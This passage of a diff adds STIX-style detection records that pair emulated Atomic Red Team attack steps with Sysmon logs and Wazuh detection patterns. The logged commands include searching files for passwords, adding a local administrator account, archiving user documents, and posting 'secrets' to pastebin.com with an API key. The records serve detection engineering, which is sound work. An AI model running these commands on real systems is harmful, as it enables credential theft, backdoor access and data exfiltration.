+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{3d676676-89e6-6877-3001-000000002700}",
+                        "parentProcessId": "4156",
+                        "parentUser": "WIN-3\\\\windows-3",
+                        "processGuid": "{3d676676-8c18-6877-a001-000000002700}",
+                        "processId": "4444",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+                        "terminalSessionId": "0",
+                        "user": "WIN-3\\\\windows-3",
+                        "utcTime": "2025-07-16 11:25:12.550"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-3.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "4824704",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1083,technique_name=File and Directory Discovery\r\nUtcTime: 2025-07-16 11:25:12.550\r\nProcessGuid: {3d676676-8c18-6877-a001-000000002700}\r\nProcessId: 4444\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {cd C:\\Users\\windows-3\\Documents\\SharedFolder\nfindstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern username}\r\nCurrentDirectory: C:\\Users\\windows-3\\AppData\\Local\\Temp\\\r\nUser: WIN-3\\windows-3\r\nLogonGuid: {3d676676-89df-6877-c0e1-140000000000}\r\nLogonId: 0x14E1C0\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {3d676676-89e6-6877-3001-000000002700}\r\nParentProcessId: 4156\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: WIN-3\\windows-3\"",
+                        "opcode": "0",
+                        "processID": "3236",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:12.5540271Z",
+                        "task": "1",
+                        "threadID": "4956",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogICgKICAgIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EIAogICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKWZpbmRzdHJcXHMrL3NpXFxzKyhwYXNzfHBhc3N3b3JkfHB3ZHxjcmVkZW50aWFsKScKICApIE9SICgKICAgIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EICgKICAgICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKXNlbGVjdC1zdHJpbmdcXHMrLipcXHMrLVBhdHRlcm5cXHMrKHBhc3N8cGFzc3dvcmR8cHdkfGNyZWRlbnRpYWwpJyBPUgogICAgICBwcm9jZXNzOmNvbW1hbmRfbGluZSBNQVRDSEVTICcoP2kpbHNcXHMrLipcXHxcXHMqc2VsZWN0LXN0cmluZ1xccysuKlxccystUGF0dGVyblxccysocGFzc3xwYXNzd29yZHxwd2R8Y3JlZGVudGlhbCknCiAgICApCiAgKQpd",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2366ea88-3c25-4ed7-9e61-8814d0823113",
+            "created": "2025-07-16T11:25:14.331748Z",
+            "modified": "2025-07-16T11:25:14.331748Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--41f7db38-a41c-4f0f-9bb6-7122072e4de5",
+            "target_ref": "x-oca-detection--41e768a5-805f-4222-9eb8-897ef1d65cfb"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--2e7e218d-2c85-48a3-9f62-28c3968bf9cc",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:20.219565Z",
+            "modified": "2025-07-16T11:25:20.219565Z",
+            "name": "Local Accounts",
+            "description": "Attacker creates a local administrator account 'art-test' on new Windows host using Atomic Red Team test T1078.003 #1, leveraging previously obtained credentials to establish persistent access with elevated privileges.",
+            "behavior_class": "anomalous",
+            "technique": "T1078.003",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.1 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0001"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--15cc38be-c4ce-4d33-8777-673570b9fc60",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:20.220608Z",
+            "modified": "2025-07-16T11:25:20.220608Z",
+            "name": "Wazuh Detection for Local Accounts",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "net  user art-test /add",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-1\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Net Command",
+                        "fileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07",
+                        "image": "C:\\\\Windows\\\\System32\\\\net.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{0d343e97-89f3-6877-1981-230000000000}",
+                        "logonId": "0x238119",
+                        "originalFileName": "net.exe",
+                        "parentCommandLine": "\\\"cmd.exe\\\" /c net user art-test /add &amp; net user art-test -4RTisCool!-321!+^&amp;P@33w0RD &amp; net localgroup administrators art-test /add",
+                        "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                        "parentProcessGuid": "{0d343e97-8c1d-6877-6f01-000000001e00}",
+                        "parentProcessId": "4828",
+                        "parentUser": "WIN-1\\\\windows-1",
+                        "processGuid": "{0d343e97-8c1d-6877-7101-000000001e00}",
+                        "processId": "5344",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1018,technique_name=Remote System Discovery",
+                        "terminalSessionId": "0",
+                        "user": "WIN-1\\\\windows-1",
+                        "utcTime": "2025-07-16 11:25:17.756"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-1.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "3239969",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-07-16 11:25:17.756\r\nProcessGuid: {0d343e97-8c1d-6877-7101-000000001e00}\r\nProcessId: 5344\r\nImage: C:\\Windows\\System32\\net.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: net  user art-test /add \r\nCurrentDirectory: C:\\Users\\windows-1\\AppData\\Local\\Temp\\\r\nUser: WIN-1\\windows-1\r\nLogonGuid: {0d343e97-89f3-6877-1981-230000000000}\r\nLogonId: 0x238119\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07\r\nParentProcessGuid: {0d343e97-8c1d-6877-6f01-000000001e00}\r\nParentProcessId: 4828\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c net user art-test /add & net user art-test -4RTisCool!-321!+^&P@33w0RD & net localgroup administrators art-test /add\r\nParentUser: WIN-1\\windows-1\"",
+                        "opcode": "0",
+                        "processID": "3448",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:17.7641138Z",
+                        "task": "1",
+                        "threadID": "3752",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICduZXQuZXhlJyBBTkQgKAogICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKW5ldFxccyt1c2VyXFxzK2FydC10ZXN0XFxzKy9hZGQnIE9SCiAgICBwcm9jZXNzOmNvbW1hbmRfbGluZSBNQVRDSEVTICcoP2kpbmV0XFxzK3VzZXJcXHMrYXJ0LXRlc3RcXHMrLionIE9SCiAgICBwcm9jZXNzOmNvbW1hbmRfbGluZSBNQVRDSEVTICcoP2kpbmV0XFxzK2xvY2FsZ3JvdXBcXHMrYWRtaW5pc3RyYXRvcnNcXHMrYXJ0LXRlc3RcXHMrL2FkZCcgT1IKICAgIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSluZXRcXHMrbG9jYWxncm91cFxccythZG1pbmlzdHJhdG9yc1xccythcnQtdGVzdFxccysvZGVsZXRlJyBPUgogICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKW5ldFxccyt1c2VyXFxzK2FydC10ZXN0XFxzKy9kZWxldGUnCiAgKQpd",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--edecd9e6-25d6-4dcc-ab77-259ca78c6cf7",
+            "created": "2025-07-16T11:25:20.221373Z",
+            "modified": "2025-07-16T11:25:20.221373Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--2e7e218d-2c85-48a3-9f62-28c3968bf9cc",
+            "target_ref": "x-oca-detection--15cc38be-c4ce-4d33-8777-673570b9fc60"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--caf4eaac-0582-47c1-ba5b-fd047a94e308",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:22.010277Z",
+            "modified": "2025-07-16T11:25:22.010277Z",
+            "name": "File and Directory Discovery",
+            "description": "Attacker conducts comprehensive file system reconnaissance on Win 4 using Atomic Red Team test T1083 #2, performing recursive PowerShell-based directory traversal to identify valuable data for collection.",
+            "behavior_class": "anomalous",
+            "technique": "T1083",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0007"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--39fca018-b40f-4804-a19c-27df6d03e7a0",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:22.011326Z",
+            "modified": "2025-07-16T11:25:22.011326Z",
+            "name": "Wazuh Detection for File and Directory Discovery",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {ls -recurse -Path \\\\\\\"\\\"C:\\\\Users\\\\windows-3\\\\Documents\\\\SharedFolder\\\\\\\"\\\" get-childitem -recurse  gci -recurse}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-1\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{0d343e97-89f3-6877-1981-230000000000}",
+                        "logonId": "0x238119",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{0d343e97-89fa-6877-3901-000000001e00}",
+                        "parentProcessId": "5812",
+                        "parentUser": "WIN-1\\\\windows-1",
+                        "processGuid": "{0d343e97-8c1e-6877-7901-000000001e00}",
+                        "processId": "2496",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+                        "terminalSessionId": "0",
+                        "user": "WIN-1\\\\windows-1",
+                        "utcTime": "2025-07-16 11:25:18.459"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-1.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "3239979",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1083,technique_name=File and Directory Discovery\r\nUtcTime: 2025-07-16 11:25:18.459\r\nProcessGuid: {0d343e97-8c1e-6877-7901-000000001e00}\r\nProcessId: 2496\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {ls -recurse -Path \\\"\"C:\\Users\\windows-3\\Documents\\SharedFolder\\\"\"\nget-childitem -recurse \ngci -recurse}\r\nCurrentDirectory: C:\\Users\\windows-1\\AppData\\Local\\Temp\\\r\nUser: WIN-1\\windows-1\r\nLogonGuid: {0d343e97-89f3-6877-1981-230000000000}\r\nLogonId: 0x238119\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {0d343e97-89fa-6877-3901-000000001e00}\r\nParentProcessId: 5812\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: WIN-1\\windows-1\"",
+                        "opcode": "0",
+                        "processID": "3448",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:18.4630228Z",
+                        "task": "1",
+                        "threadID": "3752",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EICgKICAgIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSlsc1xccystcmVjdXJzZScgT1IKICAgIHByb2Nlc3M6Y29tbWFuZF9saW5lIE1BVENIRVMgJyg/aSlnZXQtY2hpbGRpdGVtXFxzKy1yZWN1cnNlJyBPUgogICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKWdjaVxccystcmVjdXJzZScKICApCl0=",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--17230c8a-1656-4864-8b2a-4f6c6d728405",
+            "created": "2025-07-16T11:25:22.012097Z",
+            "modified": "2025-07-16T11:25:22.012097Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--caf4eaac-0582-47c1-ba5b-fd047a94e308",
+            "target_ref": "x-oca-detection--39fca018-b40f-4804-a19c-27df6d03e7a0"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--9e9040ac-f2d7-4430-a112-3dcd4b4d7289",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:22.931022Z",
+            "modified": "2025-07-16T11:25:22.931022Z",
+            "name": "Data From Local System",
+            "description": "Attacker collects sensitive files from target host using Atomic Red Team test T1005 #1, creating a compressed archive of identified valuable content using PowerShell Compress-Archive commands for subsequent exfiltration.",
+            "behavior_class": "anomalous",
+            "technique": "T1005",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0009"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--8faac53a-fe71-4b3b-888c-a55fc3251ee6",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:22.932101Z",
+            "modified": "2025-07-16T11:25:22.932101Z",
+            "name": "Wazuh Detection for Data From Local System",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {$startingDirectory = \\\\\\\"\\\"C:\\\\Users\\\\\\\"\\\" $outputZip = \\\\\\\"\\\"C:\\\\Users\\\\windows-1\\\\AppData\\\\Local\\\\Temp\\\\AtomicRedTeam\\\\..\\\\ExternalPayloads\\\\T1005\\\\\\\"\\\" $fileExtensionsString = \\\\\\\"\\\".doc, .docx, .txt\\\\\\\"\\\"  $fileExtensions = $fileExtensionsString -split \\\\\\\"\\\", \\\\\\\"\\\"  New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null  Function Search-Files {   param (     [string]$directory   )   $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {     $fileExtensions -contains $_.Extension.ToLower()   }   return $files }  $foundFiles = Search-Files -directory $startingDirectory if ($foundFiles.Count -gt 0) {   $foundFilePaths = $foundFiles.FullName   Compress-Archive -Path $foundFilePaths -DestinationPath \\\\\\\"\\\"$outputZip\\\\data.zip\\\\\\\"\\\"    Write-Host \\\\\\\"\\\"Zip file created: $outputZip\\\\data.zip\\\\\\\"\\\"   } else {       Write-Host \\\\\\\"\\\"No files found with the specified extensions.\\\\\\\"\\\"   }}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-1\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{0d343e97-89f3-6877-1981-230000000000}",
+                        "logonId": "0x238119",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{0d343e97-89fa-6877-3901-000000001e00}",
+                        "parentProcessId": "5812",
+                        "parentUser": "WIN-1\\\\windows-1",
+                        "processGuid": "{0d343e97-8c21-6877-7d01-000000001e00}",
+                        "processId": "5012",
+                        "product": "Microsoft Windows Operating System",
+                        "ruleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+                        "terminalSessionId": "0",
+                        "user": "WIN-1\\\\windows-1",
+                        "utcTime": "2025-07-16 11:25:21.244"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-1.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "3239996",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1083,technique_name=File and Directory Discovery\r\nUtcTime: 2025-07-16 11:25:21.244\r\nProcessGuid: {0d343e97-8c21-6877-7d01-000000001e00}\r\nProcessId: 5012\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {$startingDirectory = \\\"\"C:\\Users\\\"\"\n$outputZip = \\\"\"C:\\Users\\windows-1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\T1005\\\"\"\n$fileExtensionsString = \\\"\".doc, .docx, .txt\\\"\" \n$fileExtensions = $fileExtensionsString -split \\\"\", \\\"\"\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  }\n  return $files\n}\n\n$foundFiles = Search-Files -directory $startingDirectory\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName\n  Compress-Archive -Path $foundFilePaths -DestinationPath \\\"\"$outputZip\\data.zip\\\"\"\n\n  Write-Host \\\"\"Zip file created: $outputZip\\data.zip\\\"\"\n  } else {\n      Write-Host \\\"\"No files found with the specified extensions.\\\"\"\n  }}\r\nCurrentDirectory: C:\\Users\\windows-1\\AppData\\Local\\Temp\\\r\nUser: WIN-1\\windows-1\r\nLogonGuid: {0d343e97-89f3-6877-1981-230000000000}\r\nLogonId: 0x238119\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {0d343e97-89fa-6877-3901-000000001e00}\r\nParentProcessId: 5812\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: WIN-1\\windows-1\"",
+                        "opcode": "0",
+                        "processID": "3448",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:21.2473792Z",
+                        "task": "1",
+                        "threadID": "3752",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EICgKICAgICAgcHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKUdldC1DaGlsZEl0ZW1cXHMrLVBhdGguKi1GaWxlXFxzKy1SZWN1cnNlLipDb21wcmVzcy1BcmNoaXZlXFxzKy1QYXRoLiotRGVzdGluYXRpb25QYXRoLionCiAgKQpd",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--92e253d6-978e-4a67-b612-6733c6fcc52b",
+            "created": "2025-07-16T11:25:22.932813Z",
+            "modified": "2025-07-16T11:25:22.932813Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--9e9040ac-f2d7-4430-a112-3dcd4b4d7289",
+            "target_ref": "x-oca-detection--8faac53a-fe71-4b3b-888c-a55fc3251ee6"
+        },
+        {
+            "type": "x-oca-behavior",
+            "spec_version": "2.1",
+            "id": "x-oca-behavior--ac1b3bec-bb78-4793-afdc-8e6874f9b1bb",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:25.833098Z",
+            "modified": "2025-07-16T11:25:25.833098Z",
+            "name": "Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
+            "description": "Attacker exfiltrates collected data using Atomic Red Team test T1567.003 #1, leveraging PowerShell Invoke-RestMethod to POST compressed data to pastebin.com as a text storage exfiltration vector.",
+            "behavior_class": "anomalous",
+            "technique": "T1567.003",
+            "platforms": [
+                {
+                    "operating_system": "Microsoft Windows Operating System",
+                    "version": "10.0.19041.3996 (WinBuild.160101.0800)"
+                }
+            ],
+            "extensions": {
+                "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162": {
+                    "extension_type": "new-sdo"
+                }
+            },
+            "tactic": "TA0010"
+        },
+        {
+            "type": "x-oca-detection",
+            "spec_version": "2.1",
+            "id": "x-oca-detection--45cb43dd-a73d-464e-bc4c-af10af1f795f",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:25.834184Z",
+            "modified": "2025-07-16T11:25:25.834184Z",
+            "name": "Wazuh Detection for Exfiltration Over Web Service: Exfiltration to Text Storage Sites",
+            "data_sources": [
+                {
+                    "LogName": "Microsoft-Windows-Sysmon/Operational",
+                    "WinEventData": {
+                        "commandLine": "\\\"powershell.exe\\\" &amp; {$apiKey = \\\\\\\"\\\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\\\\\"\\\" $content = \\\\\\\"\\\"secrets, api keys, passwords...\\\\\\\"\\\" $url = \\\\\\\"\\\"https://pastebin.com/api/api_post.php\\\\\\\"\\\" $postData = @{   api_dev_key   = $apiKey   api_option    = \\\\\\\"\\\"paste\\\\\\\"\\\"   api_paste_code = $content } $response = Invoke-RestMethod -Uri $url -Method Post -Body $postData Write-Host \\\\\\\"\\\"Your paste URL: $response\\\\\\\"\\\"}",
+                        "company": "Microsoft Corporation",
+                        "currentDirectory": "C:\\\\Users\\\\windows-1\\\\AppData\\\\Local\\\\Temp\\\\",
+                        "description": "Windows PowerShell",
+                        "fileVersion": "10.0.19041.3996 (WinBuild.160101.0800)",
+                        "hashes": "SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",
+                        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                        "integrityLevel": "High",
+                        "logonGuid": "{0d343e97-89f3-6877-1981-230000000000}",
+                        "logonId": "0x238119",
+                        "originalFileName": "PowerShell.EXE",
+                        "parentCommandLine": "\\\"C:\\\\progra~1\\\\powershell\\\\7\\\\pwsh.exe\\\" -sshs",
+                        "parentImage": "C:\\\\PROGRA~1\\\\PowerShell\\\\7\\\\pwsh.exe",
+                        "parentProcessGuid": "{0d343e97-89fa-6877-3901-000000001e00}",
+                        "parentProcessId": "5812",
+                        "parentUser": "WIN-1\\\\windows-1",
+                        "processGuid": "{0d343e97-8c22-6877-8301-000000001e00}",
+                        "processId": "4920",
+                        "product": "Microsoft Windows Operating System",
